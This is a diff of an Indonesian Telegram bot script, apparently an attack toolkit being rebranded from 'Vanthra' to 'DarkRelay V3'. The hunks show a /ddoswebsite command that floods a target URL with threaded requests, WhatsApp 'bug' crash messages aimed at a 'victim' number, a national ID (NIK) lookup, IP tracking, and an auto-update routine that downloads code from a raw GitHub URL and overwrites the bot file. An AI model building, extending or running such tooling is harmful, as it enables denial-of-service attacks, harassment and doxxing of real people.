 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FREEZE
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -2893,16 +3031,16 @@ bot.onText(/\/delbot (.+)/, async (msg, match) => {
 
 // Auto Update
 // ============= KONSTANTA REPO =============
-const Owner = "";           // username GitHub
-const Repo = "";           // nama repository
-const BranchPath = "main/"; // branch + path file (contoh: main/index.js)
+const Owner = "animationarmufa-oss";           // username GitHub
+const Repo = "DarkRelay-update-";           // nama repository
+const BranchPath = "main/DarkRelay.js"; // branch + path file (contoh: main/index.js)
 
 // Membangun raw URL dari konstanta
 const DEFAULT_RAW_URL = `https://raw.githubusercontent.com/${Owner}/${Repo}/${BranchPath}`;
 
 // ============= KONFIGURASI =============
-const BOT_FILE = path.join(__dirname, 'KingMbape.js');
-const BACKUP_FILE = path.join(__dirname, 'KingMbape.js.bak');
+const BOT_FILE = path.join(__dirname, 'DarkRelay.js');
+const BACKUP_FILE = path.join(__dirname, 'DarkRelay.js.bak');
 
 // Fungsi download file
 async function downloadFile(url, outputPath) {
@@ -3495,7 +3633,7 @@ bot.onText(/^\/nikparse(?:\s+(.+))?$/i, async (msg, match) => {
 
     const data = result.data;
 
-    let caption = `<blockquote><b>¡ ᬊ 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 ¡</b></blockquote>\n\n`;
+    let caption = `<blockquote><b>¡ ᬊ ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ ¡</b></blockquote>\n\n`;
     caption += `┃☰. - NIK: ${nik}\n\n`;
     caption += `〢-╰➤ ° ↯ Provinsi: ${data.province || 'Tidak diketahui'}\n`;
     caption += `┃☰. - Kota/Kab: ${data.city || 'Tidak diketahui'}\n`;
@@ -3584,7 +3722,7 @@ bot.onText(/^\/trackip(?:\s+(.+))?/,  async (msg, match) => {
             )}` : null;
 
       const caption = `
-<blockquote><b>─ ¡ ᬊ 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 ¡ ─</b></blockquote>
+<blockquote><b>─ ¡ ᬊ ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ ¡ ─</b></blockquote>
 ┃☰. - IP: ${data.ip || "-"}
 〢-╰➤ ° ↯ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
 ┃☰. - Region: ${data.region || "-"}
@@ -3708,7 +3846,7 @@ bot.onText(/^\/ddoswebsite(?:\s+(.+))?$/i, async (msg, match) => {
     const [target_url, rawThreads] = args.split(" ");
     const threads = parseInt(rawThreads) || 50;
 
-    const processMsg = await bot.sendMessage(msg.chat.id, `<blockquote><b>─ ¡ ᬊ 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 ¡ ─</b></blockquote>
+    const processMsg = await bot.sendMessage(msg.chat.id, `<blockquote><b>─ ¡ ᬊ ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ ¡ ─</b></blockquote>
 ┃☰. - Target
 〢-╰➤ ° ↯  ${target_url}
 ┃☰. - Threads
@@ -3781,7 +3919,7 @@ bot.onText(/^\/ddoswebsite(?:\s+(.+))?$/i, async (msg, match) => {
             if (totalRequests % 100 === 0) {
               const elapsed = Math.floor((Date.now() - startTime) / 1000);
               await bot.editMessageText(
-                `<blockquote><b>─ ¡ ᬊ 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 ¡ ─</b></blockquote>
+                `<blockquote><b>─ ¡ ᬊ ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ ¡ ─</b></blockquote>
 ┃☰. - Target
 〢-╰➤ ° ↯  ${target_url}
 ┃☰. - Threads
@@ -3820,7 +3958,7 @@ bot.onText(/^\/ddoswebsite(?:\s+(.+))?$/i, async (msg, match) => {
     const totalDuration = Math.floor((endTime - startTime) / 1000);
 
     await bot.editMessageText(
-      `<blockquote><b>─ ¡ ᬊ 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 ¡ ─</b></blockquote>
+      `<blockquote><b>─ ¡ ᬊ ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ ¡ ─</b></blockquote>
 ┃☰. - Target
 〢-╰➤ ° ↯  ${target_url}
 ┃☰. - Threads
@@ -3890,11 +4028,7 @@ bot.onText(/^\/broadcast(?:\s+([\s\S]+))?$/, async (msg, match) => {
   await bot.sendMessage(chatId, `Pesan selesai!\n\nTerkirim: ${success}\nGagal: ${fail}`);
 });
 
-bot.onText(/^\/chatowner (.+)/, async (msg, match) => {
-  const text = match[1];
-  bot.sendMessage(OWNER_ID, "From User:\n" + text)
-  bot.sendMessage(msg.chat.id, "Succes Chat Owner !.")
-})
+
 
 async function getFileBuffer(fileId, bot) {
   const link = await bot.getFileLink(fileId)
@@ -4015,7 +4149,7 @@ bot.on("message", async msg => {
         .toFile(outputPath)
 
       await bot.sendPhoto(chatId, outputPath, {
-        caption: "✅ ⵢ Remove Bg By 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 ( 🍁 )"
+        caption: "✅ ⵢ Remove Bg By ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ ( 🍁 )"
       })
 
       fs.unlinkSync(inputPath)
@@ -4278,7 +4412,7 @@ bot.onText(/^\/testfunction(?:\s+(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ ⵢ Reply dengan function");
         
       const processMsg = await bot.sendPhoto(chatId, imageThumbnail, {
-        caption: `<blockquote><b>¡ ᬊ 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 ¡</b></blockquote>
+        caption: `<blockquote><b>¡ ᬊ ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ ¡</b></blockquote>
 ⚚. ターゲット : ${q}
 ⚚. タイプ バグ : Uknown Function 
 ⚚. バグステータス : Proccesing`,
@@ -4329,7 +4463,7 @@ bot.onText(/^\/testfunction(?:\s+(.+))?/, async (msg, match) => {
         await sleep(200)
       }
 
-      const finalText = `<blockquote><b>¡ ᬊ 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 ¡</b></blockquote>
+      const finalText = `<blockquote><b>¡ ᬊ ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ ¡</b></blockquote>
 ⚚. ターゲット : ${q}
 ⚚. タイプ バグ : Uknown Function 
 ⚚. バグステータス : Succes`;
@@ -4436,7 +4570,7 @@ bot.onText(/^\/fixcode(.*)/i, async (msg, match) => {
 
     // === Kirim hasil analisis ===
     const header = `
-<pre>¡ ᬊ 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 ¡ᐧ</pre>
+<pre>¡ ᬊ ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ ¡ᐧ</pre>
 <b>( 🛠️ ) Code Fix Result</b>
 <b>Language:</b> ${lang}
 <b>User Explanation:</b> ${userExplanation}
